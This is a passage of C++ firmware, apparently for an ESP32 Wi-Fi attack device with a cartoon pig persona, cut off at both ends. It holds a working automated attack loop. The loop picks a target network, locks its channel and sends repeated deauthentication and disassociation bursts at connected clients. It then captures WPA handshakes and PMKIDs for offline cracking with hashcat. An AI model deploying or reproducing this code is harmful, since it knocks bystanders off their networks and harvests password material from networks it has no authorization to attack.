                Serial.printf("[DBG-H1H2] ->LOCKING target=%s ch=%d PMF=%d reconLocked=%d\n", networks()[selectionIndex].ssid, networks()[selectionIndex].channel, networks()[selectionIndex].hasPMF ? 1 : 0, NetworkRecon::isChannelLocked() ? 1 : 0);
                // #endregion
                
                Mood::setStatusMessage("sniffin clients");
                Avatar::sniff();  // Nose twitch when sniffing for auths
            }
            break;
            
        case AutoState::LOCKING:
            {
            // #region agent log - H1/H2 channel during LOCKING
            {
                static uint32_t lastLockLog = 0;
                if (now - lastLockLog > 500) {
                    lastLockLog = now;
                    Serial.printf("[DBG-H1H2] LOCKING oinkCh=%d reconCh=%d locked=%d tgtIdx=%d\n", currentChannel, NetworkRecon::getCurrentChannel(), NetworkRecon::isChannelLocked() ? 1 : 0, targetIndex);
                }
            }
            // #endregion
            // Wait on target channel to discover clients via data frames
            // This is crucial - targeted deauth is much more effective
            if (targetIndex < 0) {
                autoState = AutoState::NEXT_TARGET;
                stateStartTime = now;
                deauthing = false;
                channelHopping = true;
                break;
            }
            
            // Rebind target index by BSSID snapshot (avoid stale index/races)
            DetectedNetwork targetCopy = {};
            int foundIdx = -1;
            const bool wasBusy = oinkBusy;
            oinkBusy = true;
            NetworkRecon::enterCritical();
            for (int i = 0; i < (int)networks().size(); i++) {
                if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                    targetCopy = networks()[i];
                    foundIdx = i;
                    break;
                }
            }
            NetworkRecon::exitCritical();
            oinkBusy = wasBusy;

            if (foundIdx < 0) {
                autoState = AutoState::NEXT_TARGET;
                stateStartTime = now;
                deauthing = false;
                channelHopping = true;
                targetIndex = -1;
                memset(targetBssid, 0, 6);
                break;
            }

            targetIndex = foundIdx;
            {
                uint32_t lockElapsed = now - stateStartTime;
                bool hasRecentClient = (targetCopy.clientCount > 0) &&
                    targetCopy.lastClientSeen > 0 &&
                    (now - targetCopy.lastClientSeen) <= CLIENT_RECENT_MS;

                if (!hasRecentClient && lockElapsed >= LOCK_EARLY_EXIT_MS) {
                    autoState = AutoState::NEXT_TARGET;
                    stateStartTime = now;
                    deauthing = false;
                    channelHopping = true;
                    targetIndex = -1;
                    memset(targetBssid, 0, 6);
                    break;
                }

                if (hasRecentClient && lockElapsed >= LOCK_FAST_TRACK_MS) {
                    autoState = AutoState::ATTACKING;
                    attackStartTime = now;
                    deauthCount = 0;
                    deauthing = true;
                    break;
                }

                if (lockElapsed > SwineStats::getLockTime()) {
                    autoState = AutoState::ATTACKING;
                    attackStartTime = now;
                    deauthCount = 0;
                    deauthing = true;
                    // #region agent log - H6 state to ATTACKING
                    Serial.printf("[DBG-H6] ->ATTACKING after lock timeout\n");
                    // #endregion
                }
            }
            break;
            }
            
        case AutoState::ATTACKING:
            {
                // Snapshot target data to avoid races with callback updates
                bool targetFound = false;
                uint8_t targetBssidLocal[6] = {0};
                char targetSSIDLocal[33] = {0};
                bool targetHasPMF = false;
                uint8_t clientCountLocal = 0;
                uint8_t clientMacs[MAX_CLIENTS_PER_NETWORK][6] = {};

                const bool wasBusy = oinkBusy;
                oinkBusy = true;
                NetworkRecon::enterCritical();
                for (int i = 0; i < (int)networks().size(); i++) {
                    if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                        targetFound = true;
                        targetIndex = i;
                        memcpy(targetBssidLocal, networks()[i].bssid, 6);
                        strncpy(targetSSIDLocal, networks()[i].ssid, 32);
                        targetSSIDLocal[32] = 0;
                        targetHasPMF = networks()[i].hasPMF;
                        clientCountLocal = networks()[i].clientCount;
                        if (clientCountLocal > MAX_CLIENTS_PER_NETWORK) {
                            clientCountLocal = MAX_CLIENTS_PER_NETWORK;
                        }
                        for (uint8_t c = 0; c < clientCountLocal; c++) {
                            memcpy(clientMacs[c], networks()[i].clients[c].mac, 6);
                        }
                        break;
                    }
                }
                NetworkRecon::exitCritical();
                oinkBusy = wasBusy;

                if (!targetFound) {
                    autoState = AutoState::NEXT_TARGET;
                    stateStartTime = now;
                    deauthing = false;
                    channelHopping = true;
                    targetIndex = -1;
                    memset(targetBssid, 0, 6);
                    break;
                }

                // Send deauth burst every 180ms (optimal rate per research - prevents queue saturation)
                if (now - lastDeauthTime > 180) {
                    // Skip if PMF (shouldn't happen but safety check)
                    if (targetHasPMF) {
                        selectionIndex++;
                        autoState = AutoState::NEXT_TARGET;
                        break;
                    }
                    
                    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                    
                    // PRIORITY 1: Target specific clients (MOST EFFECTIVE)
                    // Targeted deauth is much more reliable than broadcast
                    if (clientCountLocal > 0) {
                        // Get buff-modified burst count (base 5, buffed up to 8, debuffed down to 3)
                        uint8_t burstCount = SwineStats::getDeauthBurstCount();
                        // #region agent log - H6 deauth send
                        static uint32_t lastDeauthLog = 0;
                        if (now - lastDeauthLog > 1000) {
                            lastDeauthLog = now;
                            Serial.printf("[DBG-H6] DEAUTH clients=%d burst=%d total=%lu\n", clientCountLocal, burstCount, deauthCount);
                        }
                        // #endregion
                        for (uint8_t c = 0; c < clientCountLocal; c++) {
                            // Send buff-modified deauths
                            sendDeauthBurst(targetBssidLocal, clientMacs[c], burstCount);
                            deauthCount += burstCount;
                            
                            // Also disassoc targeted client
                            sendDisassocFrame(targetBssidLocal, clientMacs[c], 8);
                        }
                    }
                    
                    // PRIORITY 2: Broadcast deauth (less effective, but catches unknown clients)
                    // Only send when no clients discovered - reduces noise pollution
                    if (clientCountLocal == 0) {
                        sendDeauthFrame(targetBssidLocal, broadcast, 7);
                        sendDisassocFrame(targetBssidLocal, broadcast, 8);  // Some devices respond to disassoc only
                        deauthCount++;
                    }
                    
                    lastDeauthTime = now;
                }
                
                // Update mood with attack progress
                if (now - lastMoodUpdate > 2000) {
                    if (targetSSIDLocal[0] != 0) {
                        Mood::onDeauthing(targetSSIDLocal, deauthCount);
                    }
                    lastMoodUpdate = now;
                }
                
                // Check if handshake captured - use BSSID lookup instead of targetIndex
                // to avoid marking wrong network if cleanup shifted indices
                bool targetHandshakeCaptured = false;
                char targetHandshakeSSID[33] = {0};
                const bool wasBusyHandshake = oinkBusy;
                oinkBusy = true;
                NetworkRecon::enterCritical();
                for (const auto& hs : handshakes) {
                    if (!hs.isComplete()) continue;
                    int netIdx = -1;
                    for (int i = 0; i < (int)networks().size(); i++) {
                        if (memcmp(networks()[i].bssid, hs.bssid, 6) == 0) {
                            netIdx = i;
                            break;
                        }
                    }
                    if (netIdx >= 0) {
                        networks()[netIdx].hasHandshake = true;
                        if (targetIndex >= 0 && targetIndex < (int)networks().size() &&
                            memcmp(networks()[targetIndex].bssid, hs.bssid, 6) == 0) {
                            targetHandshakeCaptured = true;
                            strncpy(targetHandshakeSSID, networks()[netIdx].ssid, 32);
                            targetHandshakeSSID[32] = 0;
                        }
                    }
                }
                NetworkRecon::exitCritical();
                oinkBusy = wasBusyHandshake;
                if (targetHandshakeCaptured) {
                    if (targetHandshakeSSID[0] != 0) {
                        SDLog::log("OINK", "Handshake captured: %s", targetHandshakeSSID);
                    } else {
                        SDLog::log("OINK", "Handshake captured");
                    }
                    autoState = AutoState::WAITING;
                    stateStartTime = now;
                    deauthing = false;
                }
                
                // Timeout - move to next target
                if (autoState == AutoState::ATTACKING && now - attackStartTime > ATTACK_TIMEOUT) {
                    NetworkRecon::enterCritical();
                    for (auto& net : networks()) {
                        if (memcmp(net.bssid, targetBssid, 6) == 0) {
                            net.cooldownUntil = now + ATTACK_COOLDOWN_MS;
                            break;
                        }
                    }
                    NetworkRecon::exitCritical();

                    autoState = AutoState::WAITING;
                    stateStartTime = now;
                    deauthing = false;
                    // Keep channel locked during WAITING to catch late EAPOL responses
                    // Channel hopping resumes only when moving to NEXT_TARGET with no pending handshake
                }
                break;
            }
            
        case AutoState::WAITING:
            // Brief pause between attacks - keep channel locked for late EAPOL frames
            if (now - stateStartTime > WAIT_TIME) {
                // Check for incomplete handshake only once at WAIT_TIME threshold
                // to avoid repeated vector iteration overhead
                // (statics moved to file scope and reset in init())
                
                if (!checkedForPendingHandshake) {
                    checkedForPendingHandshake = true;
                    hasPendingHandshake = false;
                    if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
                        const bool wasBusy = oinkBusy;
                        oinkBusy = true;
                        NetworkRecon::enterCritical();
                        for (const auto& hs : handshakes) {
                            if (memcmp(hs.bssid, networks()[targetIndex].bssid, 6) == 0 && 
                                hs.hasM1() && !hs.hasM2()) {
                                hasPendingHandshake = true;
                                break;
                            }
                        }
                        NetworkRecon::exitCritical();
                        oinkBusy = wasBusy;
                    }
                }
                
                if (hasPendingHandshake && now - stateStartTime < WAIT_TIME * 2) {
                    // Extended wait for pending handshake (up to 2x normal = 4 sec total)
                    break;
                }
                
                // Reset for next WAITING state
                checkedForPendingHandshake = false;
                hasPendingHandshake = false;
                autoState = AutoState::NEXT_TARGET;
            }
            break;
            
        case AutoState::BORED:
            // Pig is bored - no valid targets available
            // Stop grass, show bored phrases, periodically retry
            
            // Adaptive channel hop: fast sweep (500ms) when spectrum is empty,
            // slow (2000ms) when networks present but none are valid targets
            uint32_t boredHopInterval = networks().empty() ? 500 : 2000;
            if (now - lastHopTime > boredHopInterval) {
                hopChannel();
                lastHopTime = now;
            }
            
            // Update bored mood every 5 seconds
            if (now - lastBoredUpdate > 5000) {
                Mood::onBored(networks().size());
                lastBoredUpdate = now;
            }
            
            // Check if new networks appeared (promiscuous mode still active)
            if (!networks().empty()) {
                int nextIdx = getNextTarget();
                if (nextIdx >= 0) {
                    // New valid target appeared!
                    consecutiveFailedScans = 0;
                    autoState = AutoState::NEXT_TARGET;
                    channelHopping = true;
                    Mood::setStatusMessage("new bacon!");
                    Avatar::sniff();
                    break;
                }
            }
            
            // Periodic retry - do a fresh scan every 30 seconds
            if (now - stateStartTime > BORED_RETRY_TIME) {
                autoState = AutoState::SCANNING;
                stateStartTime = now;
                channelHopping = true;
                consecutiveFailedScans = 0;  // Reset for fresh attempt
            }
            break;
    }
    
    // NOTE: Network cleanup is now handled centrally by NetworkRecon::cleanupStaleNetworks()
    // which runs every 5 seconds. This eliminates dual cleanup race conditions.
    // OINK only needs to revalidate its indices when networks change.
    
    // Periodic index revalidation (in case NetworkRecon cleaned up our target)
    if (now - lastCleanupTime > 5000) {
        lastCleanupTime = now;
        
        // Revalidate targetIndex using stored BSSID
        if (targetIndex >= 0) {
            NetworkRecon::enterCritical();
            int foundIdx = -1;
            for (int i = 0; i < (int)networks().size(); i++) {
                if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                    foundIdx = i;
                    break;
                }
            }
            NetworkRecon::exitCritical();
            
            if (foundIdx != targetIndex) {
                targetIndex = foundIdx;
                if (targetIndex < 0) {
                    deauthing = false;
                    channelHopping = true;
                    memset(targetBssid, 0, 6);
                }
            }
        }
        
        // Bounds check selectionIndex
        NetworkRecon::enterCritical();
        if (!networks().empty() && selectionIndex >= (int)networks().size()) {
            selectionIndex = networks().size() - 1;
        } else if (networks().empty()) {
            selectionIndex = 0;
        }
        NetworkRecon::exitCritical();
    }
    
    // Emergency heap recovery - also batched (max 3 per cycle)
    // 3 erases from front = ~620µs, safely under 1ms WiFi budget
    // PHASE 1 FIX: Preserve current target if possible
    if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForOinkNetworkAdd && networks().size() > 50) {
        oinkBusy = true;
        NetworkRecon::enterCritical();
        
        int emergencyErased = 0;
        while (networks().size() > 50 && emergencyErased < 3) {
            // Preserve current target if possible
            if (targetIndex >= 0 && networks().size() > 1) {
                // Check if oldest is target - if so, swap with next oldest before erasing
                if (memcmp(networks()[0].bssid, targetBssid, 6) == 0) {
                    // Target is oldest - swap with second oldest to preserve it
                    if (networks().size() > 1) {
                        std::swap(networks()[0], networks()[1]);
                    }
                }
            }
            networks().erase(networks().begin());
            emergencyErased++;
        }
        
        // Revalidate target by BSSID instead of blanket reset
        if (emergencyErased > 0 && targetIndex >= 0) {
            int foundIdx = -1;
            for (int i = 0; i < (int)networks().size(); i++) {
                if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                    foundIdx = i;
                    break;
                }
            }
            targetIndex = foundIdx;
            if (targetIndex < 0) {
                // Target was erased - only now do we abort
                deauthing = false;
                channelHopping = true;
                memset(targetBssid, 0, 6);
            }
        }
        
        // Reset selection index regardless
        if (emergencyErased > 0) {
            selectionIndex = 0;
        }
        
        NetworkRecon::exitCritical();
        oinkBusy = false;
    }

    updateTargetCache();
}

void OinkMode::startScan() {
    scanning = true;
    channelHopping = true;
    currentHopIndex = 0;
}

void OinkMode::stopScan() {
    scanning = false;
}

void OinkMode::selectTarget(int index) {
    if (index >= 0 && index < (int)networks().size()) {
        targetIndex = index;
        memcpy(targetBssid, networks()[index].bssid, 6);  // Store BSSID
        networks()[index].isTarget = true;
        
        // Clear old beacon frame when target changes (static storage, no free)
        beaconFrame = beaconFrameStorage;
        beaconFrameLen = 0;
        beaconCaptured = false;
        
        // Lock to target's channel
        channelHopping = false;
        setChannel(networks()[index].channel);
        
        // Auto-start deauth when target selected
        deauthing = true;
    }

    updateTargetCache();
}

void OinkMode::clearTarget() {
    if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
        networks()[targetIndex].isTarget = false;
    }
    targetIndex = -1;
    memset(targetBssid, 0, 6);
    deauthing = false;
    channelHopping = true;
    // Unlock channel so NetworkRecon resumes hopping
    if (NetworkRecon::isChannelLocked()) {
        NetworkRecon::unlockChannel();
    }
    updateTargetCache();
}

DetectedNetwork* OinkMode::getTarget() {
    if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
        return &networks()[targetIndex];
    }
    return nullptr;
}

void OinkMode::moveSelectionUp() {
    if (networks().empty()) return;
    selectionIndex--;
    if (selectionIndex < 0) selectionIndex = networks().size() - 1;
}

void OinkMode::moveSelectionDown() {
    if (networks().empty()) return;
    selectionIndex++;
    if (selectionIndex >= (int)networks().size()) selectionIndex = 0;
}

void OinkMode::confirmSelection() {
    if (networks().empty()) return;
    if (selectionIndex >= 0 && selectionIndex < (int)networks().size()) {
        selectTarget(selectionIndex);
    }
}

void OinkMode::startDeauth() {
    if (!running || targetIndex < 0) return;
    
    deauthing = true;
    channelHopping = false;
}

void OinkMode::stopDeauth() {
    deauthing = false;
}

void OinkMode::setChannel(uint8_t ch) {
    if (ch < 1 || ch > 14) return;
    currentChannel = ch;
    // #region agent log - H1/H2 channel conflict
    Serial.printf("[DBG-H1H2] OINK setCh=%d reconCh=%d reconLocked=%d\n", ch, NetworkRecon::getCurrentChannel(), NetworkRecon::isChannelLocked() ? 1 : 0);
    // #endregion
    // Use NetworkRecon's channel lock to prevent hopping during target lock
    NetworkRecon::lockChannel(ch);
}

void OinkMode::enableChannelHop(bool enable) {
    channelHopping = enable;
}

void OinkMode::hopChannel() {
    // Unlock NetworkRecon channel and let it handle hopping
    // OINK no longer needs to hop itself - NetworkRecon does this
    if (NetworkRecon::isChannelLocked()) {
        NetworkRecon::unlockChannel();
    }
    // Sync our currentChannel with NetworkRecon's for display purposes
    currentChannel = NetworkRecon::getCurrentChannel();
}

void OinkMode::promiscuousCallback(const wifi_promiscuous_pkt_t* pkt, wifi_promiscuous_pkt_type_t type) {
    // This callback is registered with NetworkRecon for OINK-specific packet processing
    // NetworkRecon already handles beacon/network tracking, so we focus on:
    // 1. Beacon capture for target AP (for PCAP)
    // 2. Data frame processing (EAPOL/handshake capture)
    
    if (!pkt) return;
    if (!running) return;
    if (oinkBusy) return;
    
    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;
    
    // ESP32 adds 4 ghost bytes to sig_len
    if (len > 4) len -= 4;
    if (len < 24) return;
    
    packetCount++;
    
    // #region agent log - H5 callback firing
    {
        static uint32_t lastCbLog = 0;
        static uint32_t cbCount = 0;
        cbCount++;
        uint32_t now = millis();
        if (now - lastCbLog > 3000) {
            lastCbLog = now;
            Serial.printf("[DBG-H5] OINK callback count=%lu type=%d\n", cbCount, (int)type);
        }
    }
    // #endregion
    
    const uint8_t* payload = pkt->payload;
    uint8_t frameSubtype = (payload[0] >> 4) & 0x0F;
    
    switch (type) {
        case WIFI_PKT_MGMT:
            if (frameSubtype == 0x08) {  // Beacon
                // Only capture beacon for target AP (PCAP needs it)
                processBeacon(payload, len, rssi);
            }
            // Note: Probe responses handled by NetworkRecon for SSID reveal
            break;
            
        case WIFI_PKT_DATA:
            // EAPOL/handshake capture (OINK's main job)
            processDataFrame(payload, len, rssi);
            break;
            
        default:
            break;
    }
}

void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) {
    // NOTE: Network discovery is now handled by NetworkRecon
    // This function only captures beacon for target AP (needed for PCAP/hashcat)
    
    if (len < 36) return;
    
    const uint8_t* bssid = payload + 16;
    
    // Capture beacon for target AP only
    if (targetIndex >= 0 && !beaconCaptured) {
        if (memcmp(bssid, targetBssid, 6) == 0) {
            if (len > MAX_BEACON_SIZE) {
                return;  // Drop oversized beacon
            }
            memcpy(beaconFrameStorage, payload, len);
            beaconFrame = beaconFrameStorage;
            beaconFrameLen = len;
            beaconCaptured = true;
        }
    }
    
    // Update hasHandshake flag in shared network data
    int idx = findNetwork(bssid);
    if (idx >= 0) {
        NetworkRecon::enterCritical();
        auto& nets = NetworkRecon::getNetworks();
        if (idx < (int)nets.size()) {
            nets[idx].hasHandshake = hasHandshakeFor(bssid);
        }
        NetworkRecon::exitCritical();
    }
}

// Note: Legacy processBeacon network discovery code removed
// Network tracking is now handled by NetworkRecon

void OinkMode::processProbeResponse(const uint8_t* payload, uint16_t len, int8_t rssi) {
    // Probe responses reveal hidden SSIDs
    if (len < 36) return;
    
    const uint8_t* bssid = payload + 16;
    
    // NOTE: Network discovery is now handled by NetworkRecon
    // OINK probe response processing only updates existing networks for SSID reveal
    int idx = findNetwork(bssid);
    if (idx < 0) {
        return;  // Network not yet tracked by NetworkRecon - skip
    }
    
    // Protect all network vector accesses with spinlock
    NetworkRecon::enterCritical();
    
    // Revalidate index after acquiring lock (vector may have changed)
    if (idx >= (int)networks().size()) {
        NetworkRecon::exitCritical();
        return;
    }
    
    // If network has hidden SSID, try to extract from probe response
    if (networks()[idx].ssid[0] == 0 || networks()[idx].isHidden) {
        uint16_t offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (offset + 2 + ieLen > len) break;
            
            if (id == 0 && ieLen > 0 && ieLen <= 32) {
                memcpy(networks()[idx].ssid, payload + offset + 2, ieLen);
                networks()[idx].ssid[ieLen] = 0;
                networks()[idx].isHidden = false;
                
                // DEFERRED: Queue mood event for main thread
                if (!pendingNewNetwork) {
                    strncpy(pendingNetworkSSID, networks()[idx].ssid, 32);
                    pendingNetworkSSID[32] = 0;
                    pendingNetworkRSSI = rssi;
                    pendingNetworkChannel = networks()[idx].channel;
                    pendingNewNetwork = true;
                }
                break;
            }
            
            offset += 2 + ieLen;
        }
    }
    
    networks()[idx].lastSeen = millis();
    NetworkRecon::exitCritical();
}

void OinkMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 28) return;
    
    // Extract addresses based on ToDS/FromDS flags
    uint8_t toDs = (payload[1] & 0x01);
    uint8_t fromDs = (payload[1] & 0x02) >> 1;
    
    const uint8_t* bssid = nullptr;
    const uint8_t* clientMac = nullptr;
    
    // Address layout depends on ToDS/FromDS:
    // ToDS=0, FromDS=1: Addr1=DA(client), Addr2=BSSID, Addr3=SA
    // ToDS=1, FromDS=0: Addr1=BSSID, Addr2=SA(client), Addr3=DA
    if (!toDs && fromDs) {
        // From AP to client
        bssid = payload + 10;      // Addr2
        clientMac = payload + 4;   // Addr1 (destination = client)
    } else if (toDs && !fromDs) {
        // From client to AP
        bssid = payload + 4;       // Addr1
        clientMac = payload + 10;  // Addr2 (source = client)
    }
    
    // Track client if we identified both
    if (bssid && clientMac) {
        // Don't track broadcast/multicast
        if ((clientMac[0] & 0x01) == 0) {
            trackClient(bssid, clientMac, rssi);
        }
    }
    
    // Check for EAPOL (LLC/SNAP header: AA AA 03 00 00 00 88 8E)
    // Data starts after 802.11 header (24 bytes for data frames)
    // May have QoS (2 bytes) and/or HTC (4 bytes)
    
    uint16_t offset = 24;
    
    // Adjust offset for address 4 if needed
    if (toDs && fromDs) offset += 6;
    
    // Check for QoS Data frame (subtype has bit 3 set = 0x08, 0x09, etc.)
    // Frame control byte 0: bits 4-7 = subtype, bit 3 of subtype = QoS
    uint8_t subtype = (payload[0] >> 4) & 0x0F;
    bool isQoS = (subtype & 0x08) != 0;
    if (isQoS) {
        offset += 2;  // QoS control field
    }
    
    // Check for HTC field (High Throughput Control, +HTC/Order bit)
    // Only present in QoS data frames when Order bit (bit 7 of FC byte 1) is set
    if (isQoS && (payload[1] & 0x80)) {
        offset += 4;  // HTC field
    }
    
    if (offset + 8 > len) return;
    
    // Check LLC/SNAP header for EAPOL
    if (payload[offset] == 0xAA && payload[offset+1] == 0xAA &&
        payload[offset+2] == 0x03 && payload[offset+3] == 0x00 &&
        payload[offset+4] == 0x00 && payload[offset+5] == 0x00 &&
        payload[offset+6] == 0x88 && payload[offset+7] == 0x8E) {
        
        // This is EAPOL!
        const uint8_t* srcMac = payload + 10;  // TA
        const uint8_t* dstMac = payload + 4;   // RA
        
        processEAPOL(payload + offset + 8, len - offset - 8, srcMac, dstMac, payload, len, rssi);
    }
}

void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len, 
                             const uint8_t* srcMac, const uint8_t* dstMac,
                             const uint8_t* fullFrame, uint16_t fullFrameLen, int8_t rssi) {
    if (len < 4) return;
    
    // EAPOL: version(1) + type(1) + length(2) + descriptor(...)
    uint8_t type = payload[1];
    
    if (type != 3) return;  // Only interested in EAPOL-Key
    
    if (len < 99) return;  // Minimum EAPOL-Key frame
    
    // Key info at offset 5-6
    uint16_t keyInfo = (payload[5] << 8) | payload[6];
    uint8_t install = (keyInfo >> 6) & 0x01;
    uint8_t keyAck = (keyInfo >> 7) & 0x01;
    uint8_t keyMic = (keyInfo >> 8) & 0x01;
    uint8_t secure = (keyInfo >> 9) & 0x01;
    
    uint8_t messageNum = 0;
    if (keyAck && !keyMic) messageNum = 1;
    else if (!keyAck && keyMic && !secure) messageNum = 2;  // M2: has MIC, not secure (M4 is secure)
    else if (keyAck && keyMic && install) messageNum = 3;
    else if (!keyAck && keyMic && secure) messageNum = 4;
    
    if (messageNum == 0) return;
    
    // Determine which is AP (sender of M1/M3) and station
    uint8_t bssid[6], station[6];
    if (messageNum == 1 || messageNum == 3) {
        memcpy(bssid, srcMac, 6);
        memcpy(station, dstMac, 6);
    } else {
        memcpy(bssid, dstMac, 6);
        memcpy(station, srcMac, 6);
    }
    
    // M1 = AP initiating handshake = client reconnected after deauth!
    // If we're deauthing this target, our deauth worked!
    if (messageNum == 1 && deauthing && targetIndex >= 0) {
        NetworkRecon::enterCritical();
        if (targetIndex < (int)networks().size() &&
            memcmp(bssid, networks()[targetIndex].bssid, 6) == 0) {
            // DEFERRED: Queue deauth success for main thread
            if (!pendingDeauthSuccess) {
                memcpy(pendingDeauthStation, station, 6);
                pendingDeauthSuccess = true;
            }
        }
        NetworkRecon::exitCritical();
    }
    
    // ========== PMKID EXTRACTION FROM M1 ==========
    // PMKID is in Key Data field of M1 when AP supports it (WPA2/WPA3 only)
    // EAPOL-Key frame: descriptor_type(1) @ offset 4, key_data_length(2) @ offset 97-98, key_data @ offset 99
    // Key Data contains RSN IE with PMKID: dd 14 00 0f ac 04 [16-byte PMKID]
    // Only RSN (descriptor type 0x02) has PMKID - WPA1 (0xFE) does not
    uint8_t descriptorType = payload[4];
    if (messageNum == 1 && descriptorType == 0x02 && len >= 121) {  // RSN + 99 + 22 bytes minimum
        uint16_t keyDataLen = (payload[97] << 8) | payload[98];
        
        // PMKID Key Data is exactly 22 bytes: dd(1) + len(1) + OUI(3) + type(1) + PMKID(16)
        if (keyDataLen >= 22 && len >= 99 + keyDataLen) {
            const uint8_t* keyData = payload + 99;
            
            // Look for PMKID KDE: dd 14 00 0f ac 04 (vendor IE, IEEE OUI, PMKID type)
            // Can appear at start or within Key Data
            for (uint16_t i = 0; i + 22 < keyDataLen; i++) {  // Strict < ensures 22 bytes remain
                if (keyData[i] == 0xdd && keyData[i+1] == 0x14 &&
                    keyData[i+2] == 0x00 && keyData[i+3] == 0x0f &&
                    keyData[i+4] == 0xac && keyData[i+5] == 0x04) {
                    
                    // Double-check we have 22 bytes: tag(1) + len(1) + OUI(3) + type(1) + PMKID(16)
                    if (i + 22 > keyDataLen) break;  // Defensive bounds check
                    
                    // Found PMKID KDE! Extract the 16 bytes
                    const uint8_t* pmkidData = keyData + i + 6;
                    
                    // Check if PMKID is all zeros (some APs send empty PMKID KDE)
                    bool allZeros = true;
                    for (int z = 0; z < 16; z++) {
                        if (pmkidData[z] != 0) { allZeros = false; break; }
                    }
                    if (allZeros) {
                        break;  // Skip invalid PMKID
                    }
                    
                    // Check if we already have this PMKID (lookup only - no push_back)
                    int pmkIdx = findOrCreatePMKID(bssid, station);
                    if (pmkIdx >= 0) {
                        // Protect PMKID vector access with spinlock
                        NetworkRecon::enterCritical();
                        
                        // Revalidate index
                        if (pmkIdx >= (int)pmkids.size() || pmkids[pmkIdx].saved) {
                            NetworkRecon::exitCritical();
                            break;
                        }
                        
                        CapturedPMKID& p = pmkids[pmkIdx];
                        memcpy(p.pmkid, pmkidData, 16);
                        p.timestamp = millis();
                        
                        // Look up SSID (already holding lock)
                        if (p.ssid[0] == 0) {
                            for (int ni = 0; ni < (int)networks().size(); ni++) {
                                if (memcmp(networks()[ni].bssid, bssid, 6) == 0) {
                                    strncpy(p.ssid, networks()[ni].ssid, 32);
                                    p.ssid[32] = 0;
                                    break;
                                }
                            }
                        }
                        
                        char ssidCopy[33] = {0};
                        strncpy(ssidCopy, p.ssid, 32);
                        NetworkRecon::exitCritical();
                        
                        // Queue mood event outside critical section
                        if (!pendingPMKIDCapture) {
                            strncpy(pendingPMKIDSSID, ssidCopy, 32);
                            pendingPMKIDSSID[32] = 0;
                            pendingPMKIDCapture = true;
                        }
                    } else if (pmkIdx < 0) {
                        // New PMKID - queue for creation in main thread
                        if (!pendingPMKIDCreateBusy && !pendingPMKIDCreateReady) {
                            memcpy(pendingPMKIDCreate.bssid, bssid, 6);
                            memcpy(pendingPMKIDCreate.station, station, 6);
                            memcpy(pendingPMKIDCreate.pmkid, pmkidData, 16);
                            
                            // Get SSID from networks if available (with spinlock)
                            NetworkRecon::enterCritical();
                            pendingPMKIDCreate.ssid[0] = 0;
                            for (int ni = 0; ni < (int)networks().size(); ni++) {
                                if (memcmp(networks()[ni].bssid, bssid, 6) == 0) {
                                    strncpy(pendingPMKIDCreate.ssid, networks()[ni].ssid, 32);
                                    pendingPMKIDCreate.ssid[32] = 0;
                                    break;
                                }
                            }
                            NetworkRecon::exitCritical();
                            
                            pendingPMKIDCreateReady = true;
                            
                            // Trigger auto-save for PMKID (with backfill retry)
                            pendingAutoSave = true;
                            
                            // Queue the mood event
                            if (!pendingPMKIDCapture) {
                                strncpy(pendingPMKIDSSID, pendingPMKIDCreate.ssid, 32);
                                pendingPMKIDSSID[32] = 0;
                                pendingPMKIDCapture = true;
                            }
                        }
                    }
                    break;  // Found it, stop searching
                }
            }
        }
    }
    
    // Find or create handshake entry (lookup only - no push_back)
    int hsIdx = findOrCreateHandshake(bssid, station);
    
    if (hsIdx >= 0) {
        // Protect handshake vector access with spinlock
        NetworkRecon::enterCritical();
        
        // Revalidate index after acquiring lock
        if (hsIdx >= (int)handshakes.size()) {
            NetworkRecon::exitCritical();
            return;
        }
        
        CapturedHandshake& hs = handshakes[hsIdx];
        
        // Store this frame (EAPOL payload for hashcat 22000)
        uint8_t frameIdx = messageNum - 1;
        uint16_t copyLen = min((uint16_t)512, len);
        memcpy(hs.frames[frameIdx].data, payload, copyLen);
        hs.frames[frameIdx].len = copyLen;
        hs.frames[frameIdx].messageNum = messageNum;
        hs.frames[frameIdx].timestamp = millis();
        hs.frames[frameIdx].rssi = rssi;
        
        // Store full 802.11 frame for PCAP export (radiotap + WPA-SEC compatibility)
        uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
        memcpy(hs.frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
        hs.frames[frameIdx].fullFrameLen = fullCopyLen;
        
        // Update mask
        hs.capturedMask |= (1 << frameIdx);
        hs.lastSeen = millis();
        
        // Look up SSID from networks if not set (already holding NetworkRecon critical section)
        if (hs.ssid[0] == 0) {
            for (int ni = 0; ni < (int)networks().size(); ni++) {
                if (memcmp(networks()[ni].bssid, bssid, 6) == 0) {
                    strncpy(hs.ssid, networks()[ni].ssid, 32);
                    hs.ssid[32] = 0;
                    break;
                }
            }
        }
        
        // Check completion and queue events
        bool isComplete = hs.isComplete();
        bool notSaved = !hs.saved;
        char ssidCopy[33] = {0};
        if (isComplete && notSaved) {
            strncpy(ssidCopy, hs.ssid, 32);
        }
        
        NetworkRecon::exitCritical();
        
        // Queue mood/save events outside critical section
        if (isComplete && notSaved) {
            if (!pendingHandshakeComplete) {
                strncpy(pendingHandshakeSSID, ssidCopy, 32);
                pendingHandshakeSSID[32] = 0;
                pendingHandshakeComplete = true;
            }
            pendingAutoSave = true;
        }
    } else {
        // New handshake - enqueue to circular buffer for main thread
        // Circular buffer allows queueing multiple rapid EAPOL frames (M1-M4 within ms)
        
        // Find or update existing slot for this handshake in the buffer
        uint8_t targetSlot = PENDING_HS_SLOTS;  // Invalid slot marker
        uint8_t writePos = pendingHsWrite;
        
        // Check if we already have a slot for this handshake (scan from read to write)
        uint8_t scanPos = pendingHsRead;
        while (scanPos != writePos) {
